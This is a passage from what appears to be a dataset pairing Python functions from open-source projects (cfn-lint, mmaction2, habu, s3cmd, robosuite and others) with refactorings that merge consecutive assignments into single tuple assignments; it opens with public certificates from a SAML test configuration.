IEFjY291bnQgODkxNDaCFD8svwN22QGeJtvD8xFFKE+0SYcSMA4GA1UdDwEB/wQEAwIHgDANBgkqhkiG9w0BAQUFAAOCAQEAQhB4q9jrycwbHrDSoYR1X4LFFzvJ9Us75wQquRHXpdyS9D6HUBXMGI6ahPicXCQrfLgN8vzMIiqZqfySXXv/8/dxe/X4UsWLYKYJHDJmxXD5EmWTa65chjkeP1oJAc8f3CKCpcP2lOBTthbnk2fEVAeLHR4xNdQO0VvGXWO9BliYPpkYqUIBvlm+Fg9mF7AM/Uagq2503XXIE1Lq//HON68P10vNMwLSKOtYLsoTiCnuIKGJqG37MsZVjQ1ZPRcO+LSLkq0i91gFxrOrVCrgztX4JQi5XkvEsYZGIXXjwHqxTVyt3adZWQO0LPxPqRiUqUzyhDhLo/xXNrHCu4VbMw=="",\n                        ""MIICZDCCAc2gAwIBAgIBADANBgkqhkiG9w0BAQ0FADBPMQswCQYDVQQGEwJ1czEUMBIGA1UECAwLZXhhbXBsZS5jb20xFDASBgNVBAoMC2V4YW1wbGUuY29tMRQwEgYDVQQDDAtleGFtcGxlLmNvbTAeFw0xNzA0MTUxNjMzMThaFw0xODA0MTUxNjMzMThaME8xCzAJBgNVBAYTAnVzMRQwEgYDVQQIDAtleGFtcGxlLmNvbTEUMBIGA1UECgwLZXhhbXBsZS5jb20xFDASBgNVBAMMC2V4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6GLkl5lDUZdHNDAojp5i24OoPlqrt5TGXJIPqAZYT1hQvJW5nv17MFDHrjmtEnmW4ACKEy0fAX80QWIcHunZSkbEGHb+NG/6oTi5RipXMvmHnfFnPJJ0AdtiLiPE478CV856gXekV4Xx5u3KrylcOgkpYsp0GMIQBDzleMUXlYQIDAQABo1AwTjAdBgNVHQ4EFgQUnP8vlYPGPL2n6ZzDYij2kMDC8wMwHwYDVR0jBBgwFoAUnP8vlYPGPL2n6ZzDYij2kMDC8wMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQAlQGAl+b8Cpot1g+65lLLjVoY7APJPWLW0klKQNlMU0s4MU+71Y3ExUEOXDAZgKcFoavb1fEOGMwEf38NaJAy1e/l6VNuixXShffq20ymqHQxOG0q8ujeNkgZF9k6XDfn/QZ3AD0o/IrCT7UMc/0QsfgIjWYxwCvp2syApc5CYfQ=="",\n                        ""MIIEZTCCA02gAwIBAgIUPyy/A3bZAZ4m28PzEUUoT7RJhxIwDQYJKoZIhvcNAQEFBQAwcjELMAkGA1UEBhMCVVMxKzApBgNVBAoMIk9uZUxvZ2luIFRlc3QgKHNnYXJjaWEtdXMtcHJlcHJvZCkxFTATBgNVBAsMDE9uZUxvZ2luIElkUDEfMB0GA1UEAwwWT25lTG9naW4gQWNjb3VudCA4OTE0NjAeFw0xNjA4MDQyMjI5MzdaFw0yMTA4MDUyMjI5MzdaMHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDYwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDN6iqQGcLOCglNO42I2rkzE05UXSiMXT6c8ALThMMiaDw6qqzo3sd/tKK+NcNKWLIIC8TozWVyh5ykUiVZps+08xil7VsTU7E+wKu3kvmOsvw2wlRwtnoKZJwYhnr+RkBa+h1r3ZYUgXm1ZPeHMKj1g18KaWz9+MxYL6BhKqrOzfW/P2xxVRcFH7/pq+ZsDdgNzD2GD+apzY4MZyZj/N6BpBWJ0GlFsmtBegpbX3LBitJuFkk5L4/U/jjF1AJa3boBdCUVfATqO5G03H4XS1GySjBIRQXmlUF52rLjg6xCgWJ30/+t1X+IHLJeixiQ0vxyh6C4/usCEt94cgD1r8ADAgMBAAGjgfIwge8wDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUPW0DcH0G3IwynWgi74co4wZ6n7gwga8GA1UdIwSBpzCBpIAUPW0DcH0G3IwynWgi74co4wZ6n7ihdqR0MHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDaCFD8svwN22QGeJtvD8xFFKE+0SYcSMA4GA1UdDwEB/wQEAwIHgDANBgkqhkiG9w0BAQUFAAOCAQEAQhB4q9jrycwbHrDSoYR1X4LFFzvJ9Us75wQquRHXpdyS9D6HUBXMGI6ahPicXCQrfLgN8vzMIiqZqfySXXv/8/dxe/X4UsWLYKYJHDJmxXD5EmWTa65chjkeP1oJAc8f3CKCpcP2lOBTthbnk2fEVAeLHR4xNdQO0VvGXWO9BliYPpkYqUIBvlm+Fg9mF7AM/Uagq2503XXIE1Lq//HON68P10vNMwLSKOtYLsoTiCnuIKGJqG37MsZVjQ1ZPRcO+LSLkq0i91gFxrOrVCrgztX4JQi5XkvEsYZGIXXjwHqxTVyt3adZWQO0LPxPqRiUqUzyhDhLo/xXNrHCu4VbMw==""\n                    ]\n                },\n                ""entityId"": ""https://idp.examle.com/saml/metadata"",\n                ""singleSignOnService"": {\n                    ""url"": ""https://idp.examle.com/saml/sso"",\n                    ""binding"": ""urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect""\n                }\n            }\n        }\n        '"
cfn-lint,https://github.com/aws-cloudformation/cfn-lint/tree/master/src/cfnlint/rules/functions/Ref.py,Ref,match$19,"def match(self, cfn):
        matches = []

        ref_objs = cfn.search_deep_keys(""Ref"")
        for ref_obj in ref_objs:
            value = ref_obj[-1]
            if not isinstance(value, (str)):
                message = ""Ref can only be a string for {0}""
                matches.append(
                    RuleMatch(
                        ref_obj[:-1], message.format(""/"".join(map(str, ref_obj[:-1])))
                    )
                )

        return matches","matches = []
ref_objs = cfn.search_deep_keys('Ref')","matches , ref_objs  = [], cfn.search_deep_keys('Ref')"
mmaction2,https://github.com/open-mmlab/mmaction2/tree/master/mmaction/core/evaluation/accuracy.py,,confusion_matrix$5,"def confusion_matrix(y_pred, y_real, normalize=None):
    """"""Compute confusion matrix.

    Args:
        y_pred (list[int] | np.ndarray[int]): Prediction labels.
        y_real (list[int] | np.ndarray[int]): Ground truth labels.
        normalize (str | None): Normalizes confusion matrix over the true
            (rows), predicted (columns) conditions or all the population.
            If None, confusion matrix will not be normalized. Options are
            ""true"", ""pred"", ""all"", None. Default: None.

    Returns:
        np.ndarray: Confusion matrix.
    """"""
    if normalize not in ['true', 'pred', 'all', None]:
        raise ValueError(""normalize must be one of {'true', 'pred', ""
                         ""'all', None}"")

    if isinstance(y_pred, list):
        y_pred = np.array(y_pred)
        if y_pred.dtype == np.int32:
            y_pred = y_pred.astype(np.int64)
    if not isinstance(y_pred, np.ndarray):
        raise TypeError(
            f'y_pred must be list or np.ndarray, but got {type(y_pred)}')
    if not y_pred.dtype == np.int64:
        raise TypeError(
            f'y_pred dtype must be np.int64, but got {y_pred.dtype}')

    if isinstance(y_real, list):
        y_real = np.array(y_real)
        if y_real.dtype == np.int32:
            y_real = y_real.astype(np.int64)
    if not isinstance(y_real, np.ndarray):
        raise TypeError(
            f'y_real must be list or np.ndarray, but got {type(y_real)}')
    if not y_real.dtype == np.int64:
        raise TypeError(
            f'y_real dtype must be np.int64, but got {y_real.dtype}')

    label_set = np.unique(np.concatenate((y_pred, y_real)))
    num_labels = len(label_set)
    max_label = label_set[-1]
    label_map = np.zeros(max_label + 1, dtype=np.int64)
    for i, label in enumerate(label_set):
        label_map[label] = i

    y_pred_mapped = label_map[y_pred]
    y_real_mapped = label_map[y_real]

    confusion_mat = np.bincount(
        num_labels * y_real_mapped + y_pred_mapped,
        minlength=num_labels**2).reshape(num_labels, num_labels)

    with np.errstate(all='ignore'):
        if normalize == 'true':
            confusion_mat = (
                confusion_mat / confusion_mat.sum(axis=1, keepdims=True))
        elif normalize == 'pred':
            confusion_mat = (
                confusion_mat / confusion_mat.sum(axis=0, keepdims=True))
        elif normalize == 'all':
            confusion_mat = (confusion_mat / confusion_mat.sum())
        confusion_mat = np.nan_to_num(confusion_mat)

    return confusion_mat","num_labels = len(label_set)
max_label = label_set[-1]","num_labels , max_label  = len(label_set), label_set[-1]"
mmaction2,https://github.com/open-mmlab/mmaction2/tree/master/mmaction/core/evaluation/accuracy.py,,confusion_matrix$5,"def confusion_matrix(y_pred, y_real, normalize=None):
    """"""Compute confusion matrix.

    Args:
        y_pred (list[int] | np.ndarray[int]): Prediction labels.
        y_real (list[int] | np.ndarray[int]): Ground truth labels.
        normalize (str | None): Normalizes confusion matrix over the true
            (rows), predicted (columns) conditions or all the population.
            If None, confusion matrix will not be normalized. Options are
            ""true"", ""pred"", ""all"", None. Default: None.

    Returns:
        np.ndarray: Confusion matrix.
    """"""
    if normalize not in ['true', 'pred', 'all', None]:
        raise ValueError(""normalize must be one of {'true', 'pred', ""
                         ""'all', None}"")

    if isinstance(y_pred, list):
        y_pred = np.array(y_pred)
        if y_pred.dtype == np.int32:
            y_pred = y_pred.astype(np.int64)
    if not isinstance(y_pred, np.ndarray):
        raise TypeError(
            f'y_pred must be list or np.ndarray, but got {type(y_pred)}')
    if not y_pred.dtype == np.int64:
        raise TypeError(
            f'y_pred dtype must be np.int64, but got {y_pred.dtype}')

    if isinstance(y_real, list):
        y_real = np.array(y_real)
        if y_real.dtype == np.int32:
            y_real = y_real.astype(np.int64)
    if not isinstance(y_real, np.ndarray):
        raise TypeError(
            f'y_real must be list or np.ndarray, but got {type(y_real)}')
    if not y_real.dtype == np.int64:
        raise TypeError(
            f'y_real dtype must be np.int64, but got {y_real.dtype}')

    label_set = np.unique(np.concatenate((y_pred, y_real)))
    num_labels = len(label_set)
    max_label = label_set[-1]
    label_map = np.zeros(max_label + 1, dtype=np.int64)
    for i, label in enumerate(label_set):
        label_map[label] = i

    y_pred_mapped = label_map[y_pred]
    y_real_mapped = label_map[y_real]

    confusion_mat = np.bincount(
        num_labels * y_real_mapped + y_pred_mapped,
        minlength=num_labels**2).reshape(num_labels, num_labels)

    with np.errstate(all='ignore'):
        if normalize == 'true':
            confusion_mat = (
                confusion_mat / confusion_mat.sum(axis=1, keepdims=True))
        elif normalize == 'pred':
            confusion_mat = (
                confusion_mat / confusion_mat.sum(axis=0, keepdims=True))
        elif normalize == 'all':
            confusion_mat = (confusion_mat / confusion_mat.sum())
        confusion_mat = np.nan_to_num(confusion_mat)

    return confusion_mat","y_pred_mapped = label_map[y_pred]
y_real_mapped = label_map[y_real]","y_pred_mapped , y_real_mapped  = label_map[y_pred], label_map[y_real]"
chainer-chemistry,https://github.com/chainer/chainer-chemistry/tree/master/tests/links_tests/scaler_tests/test_flow_scaler.py,,test_flow_scaler_transform_variable$40,"def test_flow_scaler_transform_variable():
    x = numpy.random.uniform(50, 100, size=100).astype(numpy.float32)
    xvar = Variable(x)
    scaler = FlowScaler(5)
    scaler.fit(xvar)  # fit takes time
    x_scaled = scaler.transform(xvar)

    assert isinstance(x_scaled, Variable)
    assert scipy.stats.kstest(x_scaled.array, 'norm').pvalue > 0.05","xvar = Variable(x)
scaler = FlowScaler(5)","xvar , scaler  = Variable(x), FlowScaler(5)"
habu,https://github.com/fportantier/habu/tree/master/habu/cli/cmd_arp_sniff.py,,procpkt$17,"def procpkt(pkt):

    now = time()
    output = '{seconds}\t{ip}\t{hwaddr}\t{vendor}'

    if conf.manufdb:
        manufdb_available = True
    else:
        manufdb_available = False

    if 'ARP' in pkt:
        hosts[pkt[ARP].psrc] = {}
        hosts[pkt[ARP].psrc]['hwaddr'] = pkt[ARP].hwsrc
        hosts[pkt[ARP].psrc]['time'] = time()

        if manufdb_available:
            hosts[pkt[ARP].psrc]['vendor'] = conf.manufdb._get_manuf(pkt[ARP].hwsrc)
        else:
            hosts[pkt[ARP].psrc]['vendor'] = 'unknown'

        click.clear()

        if not manufdb_available:
            click.echo('WARNING: manufdb is not available. Can\'t get vendor.')

        for ip in sorted(hosts):
            print(output.format(
                seconds = int(now - hosts[ip]['time']),
                ip = ip,
                hwaddr = hosts[ip]['hwaddr'],
                vendor = hosts[ip]['vendor']
            ))","now = time()
output = '{seconds}\t{ip}\t{hwaddr}\t{vendor}'","now , output  = time(), '{seconds}\t{ip}\t{hwaddr}\t{vendor}'"
habu,https://github.com/fportantier/habu/tree/master/habu/cli/cmd_arp_sniff.py,,procpkt$17,"def procpkt(pkt):

    now = time()
    output = '{seconds}\t{ip}\t{hwaddr}\t{vendor}'

    if conf.manufdb:
        manufdb_available = True
    else:
        manufdb_available = False

    if 'ARP' in pkt:
        hosts[pkt[ARP].psrc] = {}
        hosts[pkt[ARP].psrc]['hwaddr'] = pkt[ARP].hwsrc
        hosts[pkt[ARP].psrc]['time'] = time()

        if manufdb_available:
            hosts[pkt[ARP].psrc]['vendor'] = conf.manufdb._get_manuf(pkt[ARP].hwsrc)
        else:
            hosts[pkt[ARP].psrc]['vendor'] = 'unknown'

        click.clear()

        if not manufdb_available:
            click.echo('WARNING: manufdb is not available. Can\'t get vendor.')

        for ip in sorted(hosts):
            print(output.format(
                seconds = int(now - hosts[ip]['time']),
                ip = ip,
                hwaddr = hosts[ip]['hwaddr'],
                vendor = hosts[ip]['vendor']
            ))","hosts[pkt[ARP].psrc]['hwaddr'] = pkt[ARP].hwsrc
hosts[pkt[ARP].psrc]['time'] = time()","hosts[pkt[ARP].psrc]['hwaddr'] , hosts[pkt[ARP].psrc]['time']  = pkt[ARP].hwsrc, time()"
HelloDjango-blog-tutorial,https://github.com/HelloGitHub-Team/HelloDjango-blog-tutorial/tree/master/blog/tests/test_templatetags.py,BlogExtrasTestCase,test_show_archives_with_post$174,"def test_show_archives_with_post(self):
        post1 = Post.objects.create(
            title=""测试标题-1"",
            body=""测试内容"",
            category=self.cate,
            author=self.user,
            created_time=timezone.now(),
        )
        post2 = Post.objects.create(
            title=""测试标题-1"",
            body=""测试内容"",
            category=self.cate,
            author=self.user,
            created_time=timezone.now() - timedelta(days=50),
        )

        context = Context(show_archives(self.ctx))
        template = Template(""{% load blog_extras %}"" ""{% show_archives %}"")
        expected_html = template.render(context)
        self.assertInHTML('<h3 class=""widget-title"">归档</h3>', expected_html)

        created_time = post1.created_time
        url = reverse(
            ""blog:archive"",
            kwargs={""year"": created_time.year, ""month"": created_time.month},
        )
        frag = '<a href=""{}"">{} 年 {} 月</a>'.format(
            url, created_time.year, created_time.month
        )
        self.assertInHTML(frag, expected_html)

        created_time = post2.created_time
        url = reverse(
            ""blog:archive"",
            kwargs={""year"": created_time.year, ""month"": created_time.month},
        )
        frag = '<a href=""{}"">{} 年 {} 月</a>'.format(
            url, created_time.year, created_time.month
        )
        self.assertInHTML(frag, expected_html)","post1 = Post.objects.create(title='测试标题-1', body='测试内容', category=self.cate, author=self.user, created_time=timezone.now())
post2 = Post.objects.create(title='测试标题-1', body='测试内容', category=self.cate, author=self.user, created_time=timezone.now() - timedelta(days=50))
context = Context(show_archives(self.ctx))
template = Template('{% load blog_extras %}{% show_archives %}')","post1 , post2 , context , template  = Post.objects.create(title='测试标题-1', body='测试内容', category=self.cate, author=self.user, created_time=timezone.now()), Post.objects.create(title='测试标题-1', body='测试内容', category=self.cate, author=self.user, created_time=timezone.now() - timedelta(days=50)), Context(show_archives(self.ctx)), Template('{% load blog_extras %}{% show_archives %}')"
s3cmd,https://github.com/s3tools/s3cmd/tree/master/S3/ACL.py,GranteeLogDelivery,__init__$70,"def __init__(self, permission):
        """"""
        permission must be either READ_ACP or WRITE
        """"""
        Grantee.__init__(self)
        self.xsi_type = ""Group""
        self.tag = ""URI""
        self.name = Grantee.LOG_DELIVERY_URI
        self.permission = permission","self.xsi_type = 'Group'
self.tag = 'URI'
self.name = Grantee.LOG_DELIVERY_URI
self.permission = permission","self.xsi_type , self.tag , self.name , self.permission  = 'Group', 'URI', Grantee.LOG_DELIVERY_URI, permission"
sdc,https://github.com/IntelPython/sdc/tree/master/sdc/tests/test_series.py,TestSeries,test_series_append_single_dtype_promotion$3045,"def test_series_append_single_dtype_promotion(self):
        """"""Verify Series.append() implementation handles appending single Series with different dtypes""""""
        def test_impl(S, other):
            return S.append(other)
        hpat_func = self.jit(test_impl)

        S1 = pd.Series([-2., 3., 9.1], ['a1', 'b1', 'c1'])
        S2 = pd.Series([-2, 5], ['a2', 'b2'])
        pd.testing.assert_series_equal(hpat_func(S1, S2), test_impl(S1, S2))","hpat_func = self.jit(test_impl)
S1 = pd.Series([-2.0, 3.0, 9.1], ['a1', 'b1', 'c1'])
S2 = pd.Series([-2, 5], ['a2', 'b2'])","hpat_func , S1 , S2  = self.jit(test_impl), pd.Series([-2.0, 3.0, 9.1], ['a1', 'b1', 'c1']), pd.Series([-2, 5], ['a2', 'b2'])"
clearml,https://github.com/allegroai/clearml/tree/master/clearml/backend_api/services/v2_4/events.py,GetTaskPlotsRequest,__init__$2402,"def __init__(
            self, task, iters=None, scroll_id=None, **kwargs):
        super(GetTaskPlotsRequest, self).__init__(**kwargs)
        self.task = task
        self.iters = iters
        self.scroll_id = scroll_id","self.task = task
self.iters = iters
self.scroll_id = scroll_id","self.task , self.iters , self.scroll_id  = task, iters, scroll_id"
qutebrowser,https://github.com/qutebrowser/qutebrowser/tree/master/qutebrowser/browser/commands.py,CommandDispatcher,_edit_text_cb$1522,"def _edit_text_cb(self, elem):
        """"""Open editor after the focus elem was found in edit_text.""""""
        if elem is None:
            message.error(""No element focused!"")
            return
        if not elem.is_editable(strict=True):
            message.error(""Focused element is not editable!"")
            return

        text = elem.value()
        if text is None:
            message.error(""Could not get text from the focused element."")
            return
        assert isinstance(text, str), text

        caret_position = elem.caret_position()

        ed = editor.ExternalEditor(watch=True, parent=self._tabbed_browser)
        ed.file_updated.connect(functools.partial(
            self.on_file_updated, ed, elem))
        ed.editing_finished.connect(lambda: mainwindow.raise_window(
            objreg.last_focused_window(), alert=False))
        ed.edit(text, caret_position)","caret_position = elem.caret_position()
ed = editor.ExternalEditor(watch=True, parent=self._tabbed_browser)","caret_position , ed  = elem.caret_position(), editor.ExternalEditor(watch=True, parent=self._tabbed_browser)"
robosuite,https://github.com/ARISE-Initiative/robosuite/tree/master/robosuite/environments/manipulation/wipe.py,Wipe,_setup_observables$522,"def _setup_observables(self):
        """"""
        Sets up observables to be used for this environment. Creates object-based observables if enabled

        Returns:
            OrderedDict: Dictionary mapping observable names to its corresponding Observable object
        """"""
        observables = super()._setup_observables()

        # Get prefix from robot model to avoid naming clashes for multiple robots
        pf = self.robots[0].robot_model.naming_prefix
        modality = ""object""

        sensors = []
        names = []

        # Add binary contact observation
        if self.use_contact_obs:

            @sensor(modality=f""{pf}proprio"")
            def gripper_contact(obs_cache):
                return self._has_gripper_contact

            sensors.append(gripper_contact)
            names.append(f""{pf}contact"")

        # object information in the observation
        if self.use_object_obs:

            if self.use_condensed_obj_obs:
                # use implicit representation of wiping objects
                @sensor(modality=modality)
                def wipe_radius(obs_cache):
                    wipe_rad, wipe_cent, _ = self._get_wipe_information()
                    obs_cache[""wipe_centroid""] = wipe_cent
                    return wipe_rad

                @sensor(modality=modality)
                def wipe_centroid(obs_cache):
                    return obs_cache[""wipe_centroid""] if ""wipe_centroid"" in obs_cache else np.zeros(3)

                @sensor(modality=modality)
                def proportion_wiped(obs_cache):
                    return len(self.wiped_markers) / self.num_markers

                sensors += [proportion_wiped, wipe_radius, wipe_centroid]
                names += [""proportion_wiped"", ""wipe_radius"", ""wipe_centroid""]

                if self.use_robot_obs:
                    # also use ego-centric obs
                    @sensor(modality=modality)
                    def gripper_to_wipe_centroid(obs_cache):
                        return (
                            obs_cache[""wipe_centroid""] - obs_cache[f""{pf}eef_pos""]
                            if ""wipe_centroid"" in obs_cache and f""{pf}eef_pos"" in obs_cache
                            else np.zeros(3)
                        )

                    sensors.append(gripper_to_wipe_centroid)
                    names.append(""gripper_to_wipe_centroid"")

            else:
                # use explicit representation of wiping objects
                for i, marker in enumerate(self.model.mujoco_arena.markers):
                    marker_sensors, marker_sensor_names = self._create_marker_sensors(i, marker, modality)
                    sensors += marker_sensors
                    names += marker_sensor_names

            # Create observables
            for name, s in zip(names, sensors):
                observables[name] = Observable(
                    name=name,
                    sensor=s,
                    sampling_rate=self.control_freq,
                )

        return observables","observables = super()._setup_observables()
pf = self.robots[0].robot_model.naming_prefix
modality = 'object'
sensors = []
names = []","observables , pf , modality , sensors , names  = super()._setup_observables(), self.robots[0].robot_model.naming_prefix, 'object', [], []"
OWOD,https://github.com/JosephKJ/OWOD/tree/master/projects/DensePose/densepose/modeling/hrnet.py,PoseHigherResolutionNet,__init__$281,"def __init__(self, cfg, **kwargs):
        self.inplanes = cfg.MODEL.HRNET.STEM_INPLANES
        super(PoseHigherResolutionNet, self).__init__()

        # stem net
        self.conv1 = nn.Conv2d(3, 64, kernel_size=3, stride=2, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
        self.conv2 = nn.Conv2d(64, 64, kernel_size=3, stride=2, padding=1, bias=False)
        self.bn2 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
        self.relu = nn.ReLU(inplace=True)
        self.layer1 = self._make_layer(Bottleneck, 64, 4)

        self.stage2_cfg = cfg.MODEL.HRNET.STAGE2
        num_channels = self.stage2_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage2_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition1 = self._make_transition_layer([256], num_channels)
        self.stage2, pre_stage_channels = self._make_stage(self.stage2_cfg, num_channels)

        self.stage3_cfg = cfg.MODEL.HRNET.STAGE3
        num_channels = self.stage3_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage3_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition2 = self._make_transition_layer(pre_stage_channels, num_channels)
        self.stage3, pre_stage_channels = self._make_stage(self.stage3_cfg, num_channels)

        self.stage4_cfg = cfg.MODEL.HRNET.STAGE4
        num_channels = self.stage4_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage4_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition3 = self._make_transition_layer(pre_stage_channels, num_channels)
        self.stage4, pre_stage_channels = self._make_stage(
            self.stage4_cfg, num_channels, multi_scale_output=True
        )

        self._out_features = []
        self._out_feature_channels = {}
        self._out_feature_strides = {}

        for i in range(cfg.MODEL.HRNET.STAGE4.NUM_BRANCHES):
            self._out_features.append(""p%d"" % (i + 1))
            self._out_feature_channels.update(
                {self._out_features[-1]: cfg.MODEL.HRNET.STAGE4.NUM_CHANNELS[i]}
            )
            self._out_feature_strides.update({self._out_features[-1]: 1})","self.conv1 = nn.Conv2d(3, 64, kernel_size=3, stride=2, padding=1, bias=False)
self.bn1 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
self.conv2 = nn.Conv2d(64, 64, kernel_size=3, stride=2, padding=1, bias=False)
self.bn2 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
self.relu = nn.ReLU(inplace=True)","self.conv1 , self.bn1 , self.conv2 , self.bn2 , self.relu  = nn.Conv2d(3, 64, kernel_size=3, stride=2, padding=1, bias=False), nn.BatchNorm2d(64, momentum=BN_MOMENTUM), nn.Conv2d(64, 64, kernel_size=3, stride=2, padding=1, bias=False), nn.BatchNorm2d(64, momentum=BN_MOMENTUM), nn.ReLU(inplace=True)"
OWOD,https://github.com/JosephKJ/OWOD/tree/master/projects/DensePose/densepose/modeling/hrnet.py,PoseHigherResolutionNet,__init__$281,"def __init__(self, cfg, **kwargs):
        self.inplanes = cfg.MODEL.HRNET.STEM_INPLANES
        super(PoseHigherResolutionNet, self).__init__()

        # stem net
        self.conv1 = nn.Conv2d(3, 64, kernel_size=3, stride=2, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
        self.conv2 = nn.Conv2d(64, 64, kernel_size=3, stride=2, padding=1, bias=False)
        self.bn2 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
        self.relu = nn.ReLU(inplace=True)
        self.layer1 = self._make_layer(Bottleneck, 64, 4)

        self.stage2_cfg = cfg.MODEL.HRNET.STAGE2
        num_channels = self.stage2_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage2_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition1 = self._make_transition_layer([256], num_channels)
        self.stage2, pre_stage_channels = self._make_stage(self.stage2_cfg, num_channels)

        self.stage3_cfg = cfg.MODEL.HRNET.STAGE3
        num_channels = self.stage3_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage3_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition2 = self._make_transition_layer(pre_stage_channels, num_channels)
        self.stage3, pre_stage_channels = self._make_stage(self.stage3_cfg, num_channels)

        self.stage4_cfg = cfg.MODEL.HRNET.STAGE4
        num_channels = self.stage4_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage4_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition3 = self._make_transition_layer(pre_stage_channels, num_channels)
        self.stage4, pre_stage_channels = self._make_stage(
            self.stage4_cfg, num_channels, multi_scale_output=True
        )

        self._out_features = []
        self._out_feature_channels = {}
        self._out_feature_strides = {}

        for i in range(cfg.MODEL.HRNET.STAGE4.NUM_BRANCHES):
            self._out_features.append(""p%d"" % (i + 1))
            self._out_feature_channels.update(
                {self._out_features[-1]: cfg.MODEL.HRNET.STAGE4.NUM_CHANNELS[i]}
            )
            self._out_feature_strides.update({self._out_features[-1]: 1})","self.layer1 = self._make_layer(Bottleneck, 64, 4)
self.stage2_cfg = cfg.MODEL.HRNET.STAGE2","self.layer1 , self.stage2_cfg  = self._make_layer(Bottleneck, 64, 4), cfg.MODEL.HRNET.STAGE2"
OWOD,https://github.com/JosephKJ/OWOD/tree/master/projects/DensePose/densepose/modeling/hrnet.py,PoseHigherResolutionNet,__init__$281,"def __init__(self, cfg, **kwargs):
        self.inplanes = cfg.MODEL.HRNET.STEM_INPLANES
        super(PoseHigherResolutionNet, self).__init__()

        # stem net
        self.conv1 = nn.Conv2d(3, 64, kernel_size=3, stride=2, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
        self.conv2 = nn.Conv2d(64, 64, kernel_size=3, stride=2, padding=1, bias=False)
        self.bn2 = nn.BatchNorm2d(64, momentum=BN_MOMENTUM)
        self.relu = nn.ReLU(inplace=True)
        self.layer1 = self._make_layer(Bottleneck, 64, 4)

        self.stage2_cfg = cfg.MODEL.HRNET.STAGE2
        num_channels = self.stage2_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage2_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition1 = self._make_transition_layer([256], num_channels)
        self.stage2, pre_stage_channels = self._make_stage(self.stage2_cfg, num_channels)

        self.stage3_cfg = cfg.MODEL.HRNET.STAGE3
        num_channels = self.stage3_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage3_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition2 = self._make_transition_layer(pre_stage_channels, num_channels)
        self.stage3, pre_stage_channels = self._make_stage(self.stage3_cfg, num_channels)

        self.stage4_cfg = cfg.MODEL.HRNET.STAGE4
        num_channels = self.stage4_cfg.NUM_CHANNELS
        block = blocks_dict[self.stage4_cfg.BLOCK]
        num_channels = [num_channels[i] * block.expansion for i in range(len(num_channels))]
        self.transition3 = self._make_transition_layer(pre_stage_channels, num_channels)
        self.stage4, pre_stage_channels = self._make_stage(
            self.stage4_cfg, num_channels, multi_scale_output=True
        )

        self._out_features = []
        self._out_feature_channels = {}
        self._out_feature_strides = {}

        for i in range(cfg.MODEL.HRNET.STAGE4.NUM_BRANCHES):
            self._out_features.append(""p%d"" % (i + 1))
            self._out_feature_channels.update(
                {self._out_features[-1]: cfg.MODEL.HRNET.STAGE4.NUM_CHANNELS[i]}
            )
            self._out_feature_strides.update({self._out_features[-1]: 1})","self._out_features = []
self._out_feature_channels = {}
self._out_feature_strides = {}","self._out_features , self._out_feature_channels , self._out_feature_strides  = [], {}, {}"
pytorchvideo,https://github.com/facebookresearch/pytorchvideo/tree/master/pytorchvideo/data/encoded_video_pyav.py,EncodedVideoPyAV,get_clip$151,"def get_clip(
        self, start_sec: float, end_sec: float
    ) -> Dict[str, Optional[torch.Tensor]]:
        """"""
        Retrieves frames from the encoded video at the specified start and end times
        in seconds (the video always starts at 0 seconds). Returned frames will be in
        [start_sec, end_sec). Note that 1) if you want to avoid float precision issue
        and need accurate frames, please use Fraction for start_sec and end_sec.
        2) As end_sec is exclusive, so you may need to use
        `get_clip(start_sec, duration + EPS)` to get the last frame.

        Args:
            start_sec (float): the clip start time in seconds
            end_sec (float): the clip end time in seconds
        Returns:
            clip_data:
                A dictionary mapping the entries at ""video"" and ""audio"" to a tensors.

                ""video"": A tensor of the clip's RGB frames with shape:
                (channel, time, height, width). The frames are of type torch.float32 and
                in the range [0 - 255].

                ""audio"": A tensor of the clip's audio samples with shape:
                (samples). The samples are of type torch.float32 and
                in the range [0 - 255].

            Returns None if no video or audio found within time range.

        """"""
        if self._selective_decoding:
            self._video, self._audio = self._pyav_decode_video(start_sec, end_sec)

        video_frames = None
        if self._video is not None:
            video_start_pts = secs_to_pts(
